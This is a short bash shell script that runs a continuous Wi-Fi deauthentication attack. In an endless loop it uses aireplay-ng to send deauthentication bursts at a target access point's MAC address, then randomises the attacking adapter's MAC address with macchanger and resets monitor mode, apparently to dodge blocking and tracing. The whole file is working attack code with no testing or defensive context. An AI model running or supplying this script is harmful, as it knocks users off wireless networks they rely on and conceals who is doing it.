#!/bin/bash -ex

./set_monitor_mode_on_wireless_adapter.sh

while true 
do 

        sudo aireplay-ng -0 5 -a ${mac_addr} ${wireless_adapter}
        sudo ifconfig ${wireless_adapter} down
        sudo macchanger -r ${wireless_adapter} | grep "New MAC"
        sudo iwconfig ${wireless_adapter} mode monitor
        sudo ifconfig ${wireless_adapter} up
        sudo iwconfig ${wireless_adapter} | grep Mode
        sleep 3
        echo waiting...

done
